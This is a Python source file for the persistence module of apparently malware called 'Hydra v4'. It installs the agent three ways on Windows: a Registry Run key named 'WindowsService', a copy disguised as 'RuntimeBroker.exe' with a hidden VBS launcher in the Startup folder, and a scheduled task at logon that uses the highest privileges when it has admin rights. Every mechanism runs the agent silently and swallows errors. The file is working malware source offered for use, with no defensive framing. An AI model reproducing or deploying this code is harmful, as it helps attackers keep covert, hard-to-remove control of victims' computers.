"""
Hydra v4 — Persistence module.
Triple redundancy: registry RUN key + Scheduled Task + Startup folder.
"""
import os
import sys
import subprocess
import tempfile


def install(cfg: dict, me: dict, is_admin: bool):
    """Install all persistence mechanisms."""
    agent_id = me.get("id", "HYDRA")
    exe_path = _get_exe_path()

    results = {
        "registry": _install_registry(exe_path),
        "startup": _install_startup(exe_path, agent_id),
        "scheduled_task": _install_scheduled_task(exe_path, agent_id, is_admin),
    }
    return results


def _get_exe_path() -> str:
    """Get the path to our executable."""
    if getattr(sys, 'frozen', False):
        # PyInstaller
        return sys.executable
    else:
        # Running as Python script
        return os.path.abspath(sys.argv[0] if sys.argv else __file__)


def _install_registry(exe_path: str) -> bool:
    """Add HKCU Run key entry."""
    try:
        import winreg
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, "WindowsService", 0, winreg.REG_SZ,
                              f'"{exe_path}" --silent')
        return True
    except:
        return False


def _install_startup(exe_path: str, agent_id: str) -> bool:
    """Copy to Startup folder + create VBS launcher."""
    try:
        startup = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        os.makedirs(startup, exist_ok=True)

        # Copy executable
        import shutil
        target_exe = os.path.join(startup, "RuntimeBroker.exe")
        try:
            shutil.copy2(exe_path, target_exe)
        except:
            # File might be in use — use a VBS launcher instead
            pass

        # VBS launcher (always works, even if EXE is locked)
        vbs_path = os.path.join(startup, "WindowsService.vbs")
        with open(vbs_path, 'w') as f:
            f.write(f'CreateObject("Wscript.Shell").Run """{exe_path}"" --silent", 0, False\n')

        # Set hidden attribute
        import ctypes
        ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 2)  # FILE_ATTRIBUTE_HIDDEN

        return True
    except:
        return False


def _install_scheduled_task(exe_path: str, agent_id: str, is_admin: bool) -> bool:
    """Create a scheduled task that runs at user logon."""
    task_name = "WindowsService"
    try:
        cmd = (
            f'schtasks /create /tn "{task_name}" '
            f'/tr "\\"{exe_path}\\" --silent" '
            f'/sc onlogon '
            f'/rl {"highest" if is_admin else "limited"} '
            f'/f'
        )
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.returncode == 0
    except:
        return False
